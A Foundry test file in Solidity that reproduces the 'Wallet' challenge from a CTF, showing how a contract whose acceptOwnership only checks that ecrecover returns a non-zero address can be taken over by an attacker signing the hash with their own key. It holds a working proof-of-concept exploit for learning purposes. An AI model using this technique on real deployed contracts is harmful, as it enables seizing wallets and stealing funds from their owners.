// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Wallet/Wallet.sol";

/// @title Wallet signature-check exploit reproduction
/// @notice MixBytes Farm CTF (2022-2023) - "Wallet" challenge, replayed locally
///         against a vm-managed chain since the original Goerli testnet is gone.
/// @dev Wallet.sol is the intentionally vulnerable / pre-written challenge
///      contract and is NOT modified by this test.
///
/// Vulnerability:
///   `acceptOwnership(uint8 v, bytes32 r, bytes32 s)` is supposed to let a new
///   owner take over only if the *current* owner signed off on the transfer:
///
///       require(ecrecover(generateHash(owner), v, r, s) != address(0), "...");
///       previousOwner = owner;
///       owner = msg.sender;
///
///   The intent is: `ecrecover` should recover the CURRENT `owner` address
///   from the signature, proving that `owner` approved the handover.
///   But the code never checks that the recovered address equals `owner` -
///   it only checks that the recovered address is not `address(0)`, which is
///   true for ANY valid (v, r, s) signature over that hash, regardless of
///   which private key produced it. So anyone can sign `generateHash(owner)`
///   with their OWN private key, pass the resulting (v, r, s) to
///   `acceptOwnership`, have `ecrecover` correctly recover their OWN address
///   (which is != address(0)), sail through the check, and become the new
///   `owner` - without the real owner ever having signed anything.
contract WalletTest is Test {
    Wallet wallet;

    address originalOwner;
    uint256 playerKey = 0xA11CE;
    address player;

    function setUp() public {
        originalOwner = makeAddr("originalOwner");
        player = vm.addr(playerKey);

        vm.prank(originalOwner);
        wallet = new Wallet();
    }

    function test_HijackOwnershipViaSelfSignedSignature() public {
        console.log("=== Initial state ===");
        console.log("Wallet owner (before):", wallet.owner());
        console.log("Player address       :", player);
        assertEq(wallet.owner(), originalOwner, "wallet should start owned by originalOwner");

        // The contract's check only cares that SOME valid signature recovers
        // to a non-zero address over generateHash(owner) - it never compares
        // the recovered address against `owner`. So instead of obtaining a
        // signature from `originalOwner` (which the real owner would never
        // hand over), the attacker (`player`) signs the hash with THEIR OWN
        // private key (`playerKey`). `generateHash` already applies the
        // EIP-191 "\x19Ethereum Signed Message:\n32" prefix internally and
        // returns the final digest, so vm.sign is called directly on that
        // digest (no extra prefixing needed/wanted here).
        bytes32 digest = wallet.generateHash(wallet.owner());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerKey, digest);

        // Sanity check: the signature recovers to `player`, NOT to `owner`.
        // This is exactly the bug - acceptOwnership only checks != address(0),
        // never that the recovered signer actually equals the current owner.
        assertEq(ecrecover(digest, v, r, s), player, "signature must be player's own, not owner's");

        vm.prank(player);
        wallet.acceptOwnership(v, r, s);

        console.log("=== After exploit ===");
        console.log("Wallet owner (after) :", wallet.owner());
        console.log("Previous owner       :", wallet.previousOwner());

        assertEq(wallet.owner(), player, "player should have hijacked ownership");
        assertEq(wallet.previousOwner(), originalOwner, "previousOwner should be recorded as the original owner");
    }
}
